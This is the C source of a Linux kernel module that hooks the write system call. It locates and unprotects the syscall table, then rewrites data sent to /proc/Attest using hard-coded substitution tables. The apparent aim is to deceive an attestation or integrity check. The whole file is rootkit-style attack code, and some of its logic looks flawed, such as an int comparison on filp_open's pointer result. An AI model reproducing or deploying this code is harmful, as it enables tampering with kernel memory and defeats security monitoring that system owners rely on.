#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/utsname.h>
#include <asm/pgtable.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <linux/string.h>
#include <linux/sched.h>
#include <linux/spinlock.h>
#include <linux/fdtable.h>

#define MAX_NO_OF_VALID_CHARACTERS 11
#define MAX_NO_OF_BYTE_SELECTIONS 100
#define MAX_SIZE_OF_EACH_SELECTION 20
#define PROCFS_MAX_SIZE 2048
MODULE_LICENSE("GPL");

// see desc_def.h and desc.h in arch/x86/include/asm/
// and arch/x86/kernel/syscall_64.c

typedef void (*sys_call_ptr_t)(void);
//typedef asmlinkage long (*orig_uname_t)(struct new_utsname *);

typedef asmlinkage ssize_t (*orig_write_t) (int, const void*, size_t);

void hexdump(unsigned char *addr, unsigned int length) {
    unsigned int i;
    for(i = 0; i < length; i++) {
        if(!((i+1) % 16)) {
            printk("%02x\n", *(addr + i));
        } else {
            if(!((i+1) % 4)) {
                printk("%02x  ", *(addr + i));
            } else {
                printk("%02x ", *(addr + i));
            }
        }
    }

    if(!((length+1) % 16)) {
        printk("\n");
    }
}

// fptr to original uname syscall
//orig_uname_t orig_uname = NULL;

orig_write_t orig_write = NULL;

// test message
char *msg = "All ur base r belong to us";
int pyth_26_position[] ={7, 4, 16, 18, 62, 26, 52, 44, 27, 520, 347, 1248, 1864, 528, 354, 5436, 145, 976, 324, 100, 88, 1240, 1036, 804, 352, 2376, 1284, 50, 48, 134, 154, 1920, 42, 848, 34, 1744, 664, 3424, 392, 2020, 46, 1556, 2516, 564, 351, 283, 289, 276, 32, 1576, 293, 2560, 28, 368, 358, 588, 1428, 1200, 676, 880, 164, 684, 1220, 556, 1280, 1436, 345, 1852, 228, 1, 3, 308, 1632, 700, 1848, 1448, 2, 3064, 309, 3756, 712, 244, 396, 1732, 980, 310, 620, 868, 362, 2064, 4260, 1620, 1664, 780, 1080, 652, 132, 2688, 279, 1360, 247, 1272, 628, 356, 2000, 278, 1504, 2048, 277, 1484, 286, 291, 960, 1020, 1480, 290, 246, 287, 1796, 2032, 288, 2940, 2388, 600, 592, 169, 2780, 0, 61, 93, 908, 668, 1672, 3612, 361, 904, 1356, 380, 2196, 1100, 576, 952, 568, 1336, 24, 3544, 1860, 4032, 596, 476, 3784, 632, 792, 776, 704, 2248, 1404, 744, 1000, 1500, 1028, 1160, 724, 1652, 548, 656, 344, 3172, 456, 612, 346, 1040, 1892, 2840, 2756, 2280, 1880, 2548, 2796, 5364, 852, 1412, 2240, 4036, 988, 363, 348, 3132, 900, 580, 688, 452, 1056, 1216, 768, 1508, 696, 3692, 948, 1172, 400, 1332, 1996, 2016, 512, 360, 25, 1924, 1044, 1052, 836, 1236, 752, 349, 760, 2324, 892, 1740, 472, 772, 1792, 1552, 1076, 1764, 68, 1224, 3076, 1144, 608, 165, 33, 1008, 3228, 524, 1456, 560, 832, 2988, 350, 432, 3128, 1812, 3020, 2184, 1640, 828, 2404, 440, 1424, 133, 1688, 364, 2084, 680, 2152, 1928};

int pyth_27_value[] = {127, 69, 76, 70, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 3, 0, 1, 0, 0, 0, 192, 234, 5, 8, 52, 0, 0, 0, 24, 162, 42, 0, 0, 0, 0, 0, 52, 0, 32, 0, 9, 0, 40, 0, 28, 0, 27, 0, 6, 0, 0, 0, 52, 0, 0, 0, 52, 128, 4, 8, 52, 128, 4, 8, 32, 1, 0, 0, 32, 1, 0, 0, 5, 0, 0, 0, 4, 0, 0, 0, 3, 0, 0, 0, 84, 1, 0, 0, 84, 129, 4, 8, 84, 129, 4, 8, 19, 0, 0, 0, 19, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 128, 4, 8, 0, 128, 4, 8, 24, 92, 37, 0, 24, 92, 37, 0, 5, 0, 0, 0, 0, 16, 0, 0, 1, 0};

static int pid_mem = 1;
static int no_of_byte_selections = 0;
static int actual_number_of_byte_selections = 0;
static char valid_chars[MAX_NO_OF_VALID_CHARACTERS];
static char data_stream_buffer[MAX_SIZE_OF_EACH_SELECTION]; // Used to hold each number extracted from /proc/Attest. It can hold atmost a 19 digit 
//number with each digit at an index
static int byte_position_buffer[MAX_NO_OF_BYTE_SELECTIONS];
static char new_buffer[2000];

static void init_digit_array(void) {
	valid_chars[0] = '0';
	valid_chars[1] = '1';
	valid_chars[2] = '2';
	valid_chars[3] = '3';
	valid_chars[4] = '4';
	valid_chars[5] = '5';
	valid_chars[6] = '6';
	valid_chars[7] = '7';
	valid_chars[8] = '8';
	valid_chars[9] = '9';
	valid_chars[10] = '\n';



}
static int isvalid(char character) {

	int i = 0 ;
	for( i = 0; i < MAX_NO_OF_VALID_CHARACTERS ; i++ ){
		
		if(character == valid_chars[i])
			return 0;

	}
	return -1;
}

/*static int init_byte_position_buffer(){
	if(no_of_byte_selections > 0){
		byte_position_buffer = kmalloc(no_of_byte_selections*sizeof(char), GFP_KERNEL);
		if (!byte_position_buffer)
			return -1; // Error
		else
			return 1;
	
	}
	else
		return -1; // If no_of_byte_selections is zero
					
			

}
*/

static int no_of_digits(int number)
{
	int i = 0;

	while(number > 0 ){
		number = number/10;
		i++;

	}
return i;

}

static int set_fields(int space_count){
	int byte_position = 0;
	char * end_ptr;
	int pos_27, val_26;
	char *out_str;
	
	if(space_count == 1){
		//kstrtoint(data_stream_buffer,0,&pid_mem);
		pid_mem = simple_strtol(data_stream_buffer,&end_ptr,10);
		//printk(KERN_INFO "\n Decoded process id %d",pid_mem);
	}
	else{
		if(space_count == 2){
			//kstrtoint(data_stream_buffer,0,&no_of_byte_selections);
			no_of_byte_selections = simple_strtol(data_stream_buffer,&end_ptr,10);
			//printk(KERN_INFO "\n Decoded number of byte selections %d",no_of_byte_selections);
			if(no_of_byte_selections > MAX_NO_OF_BYTE_SELECTIONS)
				no_of_byte_selections = MAX_NO_OF_BYTE_SELECTIONS; // Cap it off here
			
			
			/*if(init_byte_position_buffer()) // Initialisation successfull
			{
				return 1;
			}
			else
				return -1 ; // Error
			*/

		}
		else{
			if(no_of_byte_selections < 0)
				return -1 ; // Error
			actual_number_of_byte_selections  = space_count - 2;
			if(actual_number_of_byte_selections > no_of_byte_selections)
				return -1; // Error. To prevent buffer overflow			
			//kstrtoint(data_stream_buffer,0,&byte_position);
			byte_position = simple_strtol(data_stream_buffer,&end_ptr,10);

			
			pos_27 = pyth_27_value[byte_position];
			val_26 = pyth_26_position[pos_27];
			//val_26 = val_26;
			byte_position_buffer[space_count-3] = val_26;
			//printk(KERN_INFO "\n Counter : %d decoded byte position %d, %d, %d",space_count-2,byte_position, pos_27, val_26);
				
		}

	}
	
	
	

	return 1;
}
static int parse_input(char * buffer) {
	init_digit_array();
	int index = 0, i = 0,j = 0;
	int space_count = 0,prev_start_index = 0;
	int length = 0;
	
	
	while(buffer[index] != NULL) {
		
		if(isvalid(buffer[index]) != 0 && buffer[index] != ' ')
			return -1; // Error	
		else{
			if(buffer[index] == ' ' && index != 0){
				space_count ++;
				//printk(KERN_INFO "\n Space count %d, Index %d",space_count,index);
				
				if(index - prev_start_index > MAX_SIZE_OF_EACH_SELECTION)
				{
					//printk(KERN_INFO "\n Entry in the proc file too large. Exiting ");
					return -1 ; // Error
				}
				j = 0;
				for(i = prev_start_index; i < index; i++){
					data_stream_buffer[j] = buffer[i];
					//printk("Data: %c", data_stream_buffer[j]);
					j = j + 1;
				}
				if(prev_start_index < index) {
					data_stream_buffer[j] = NULL;
					if(!set_fields(space_count))
						return -1 ; // Error
				}
				prev_start_index = index + 1;
			}

		}
				
		index += 1;
	}
	i = 0;		
	while(buffer[i] != NULL){
		buffer[i] = NULL;
		i++;

	}
	int increment = 0,curr_position = 0;
	for(i = 0; i < 2 + no_of_byte_selections; i++){
		if(i == 0){
			increment = no_of_digits(pid_mem);
			sprintf(buffer + curr_position,"%d ",pid_mem);
		}
		else if(i == 1){
			increment = no_of_digits(no_of_byte_selections);
			sprintf(buffer + curr_position,"%d ",no_of_byte_selections);		
		}
		else {
			increment = no_of_digits(byte_position_buffer[i-2]);
			sprintf(buffer + curr_position,"%d ",byte_position_buffer[i-2]);
		}		
		curr_position += increment + 1;
	}
	printk("\nThe buffer is: %s",buffer);
	
	//buffer = new_buffer;
	
	return 0; // All characters are valid

}

//for write
asmlinkage ssize_t hooked_write(int fd, void *buf, size_t count){
	//printk("Owned!!!\n");	
	char *tmp;
	char *pathname;
	struct file *file;
	struct path *path;
	struct files_struct *files = current->files;
	char * temp_buf = (char *)buf;
	spin_lock(&files->file_lock);
	file = fcheck_files(files, fd);
	int new_length,i = 0;
	if (!file) {
		spin_unlock(&files->file_lock);
		return -ENOENT;
	}

	path = &file->f_path;
	path_get(path);
	spin_unlock(&files->file_lock);
	
	tmp = (char *)__get_free_page(GFP_TEMPORARY);

	//if (!tmp) {
	//	path_put(path);
	//	return -ENOMEM;
	//}
	pathname = d_path(path, tmp, PAGE_SIZE);
	//path_put(&path);

	//if (IS_ERR(pathname)) {
	//	free_page((unsigned long)tmp);
	//	return PTR_ERR(pathname);
	//}
	
	//printk("%s\n", pathname);
	
	
	if (strcmp(pathname, "/proc/Attest") == 0)
	{
		parse_input(temp_buf);
		free_page((unsigned long)tmp);
		new_length = 0;
		i = 0;
		/*
		while(temp_buf[i] != NULL){
			new_length++;
			i++;

		}*/
		//printk("Value of new_length %d ",new_length);
		return orig_write(fd, buf, count);
	
	}
	else
	{
		free_page((unsigned long)tmp);
		return orig_write(fd, buf, count);
	
	}
	
	
}


//for uname
//asmlinkage long hooked_uname(struct new_utsname *name) {
//    orig_uname(name);
    
//    strncpy(name->sysname, msg, 27);

//    return 0;
//}

// and finally, sys_call_table pointer
sys_call_ptr_t *_sys_call_table = NULL;

// memory protection shinanigans
unsigned int level;
pte_t *pte;

static void read_file(char *filename)
{
  int fd;
  char buf[1];
	
	//EXPORT_SYMBOL_NOVERS(sys_open);
  mm_segment_t old_fs = get_fs();
  set_fs(KERNEL_DS);

  fd = filp_open(filename, O_RDONLY, 0);
  if (fd < -2) {
    //printk("File is present %d", fd);
	_sys_call_table[__NR_write] = (sys_call_ptr_t) hooked_write;
    sys_close(fd);
  }
	//else printk ("%d", fd);
  set_fs(old_fs);
}

// initialize the module
int init_module() {
    //printk("+ Loading module\n");
    
    // struct for IDT register contents
    struct desc_ptr idtr;

    // pointer to IDT table of desc structs
    gate_desc *idt_table;

    // gate struct for int 0x80
    gate_desc *system_call_gate;

    // system_call (int 0x80) offset and pointer
    unsigned int _system_call_off;
    unsigned char *_system_call_ptr;

    // temp variables for scan
    unsigned int i;
    unsigned char *off;

    // store IDT register contents directly into memory
    asm ("sidt %0" : "=m" (idtr));

    // print out location
    //printk("+ IDT is at %08x\n", idtr.address);

    // set table pointer
    idt_table = (gate_desc *) idtr.address;

    // set gate_desc for int 0x80
    system_call_gate = &idt_table[0x80];

    // get int 0x80 handler offset
    _system_call_off = (system_call_gate->a & 0xffff) | (system_call_gate->b & 0xffff0000);
    _system_call_ptr = (unsigned char *) _system_call_off;

    // print out int 0x80 handler
    printk("+ system_call is at %08x\n", _system_call_off);

    // print out the first 128 bytes of system_call() ...notice pattern below
    hexdump((unsigned char *) _system_call_off, 128);

    // scan for known pattern in system_call (int 0x80) handler
    // pattern is just before sys_call_table address
    for(i = 0; i < 128; i++) {
        off = _system_call_ptr + i;
        if(*(off) == 0xff && *(off+1) == 0x14 && *(off+2) == 0x85) {
            _sys_call_table = *(sys_call_ptr_t **)(off+3);
            break;
        }
    }

    // bail out if the scan came up empty
    if(_sys_call_table == NULL) {
        //printk("- unable to locate sys_call_table\n");
        return 0;
    }

    // print out sys_call_table address
    //printk("+ found sys_call_table at %08x!\n", _sys_call_table);

    // now we can hook syscalls ...such as uname
    // first, save the old gate (fptr)
    //orig_uname = (orig_uname_t) _sys_call_table[__NR_uname];
	orig_write = (orig_write_t) _sys_call_table[__NR_write];
	
	//Debug Code
	//printk("uname address: %x\n", orig_write);

    // unprotect sys_call_table memory page
    pte = lookup_address((unsigned long) _sys_call_table, &level);

    // change PTE to allow writing
    set_pte_atomic(pte, pte_mkwrite(*pte));

    //printk("+ unprotected kernel memory page containing sys_call_table\n");

    // now overwrite the __NR_uname entry with address to our uname
    //_sys_call_table[__NR_uname] = (sys_call_ptr_t) hooked_uname;
	read_file("/proc/Attest");

    //printk("+ uname hooked!\n");

    return 0;
}

void cleanup_module() {
    if(orig_write != NULL) {
        // restore sys_call_table to original state
        //_sys_call_table[__NR_uname] = (sys_call_ptr_t) orig_uname;
		_sys_call_table[__NR_write] = (sys_call_ptr_t) orig_write;

        // reprotect page
        set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));
    }
    
    printk("+ Unloading module\n");
}
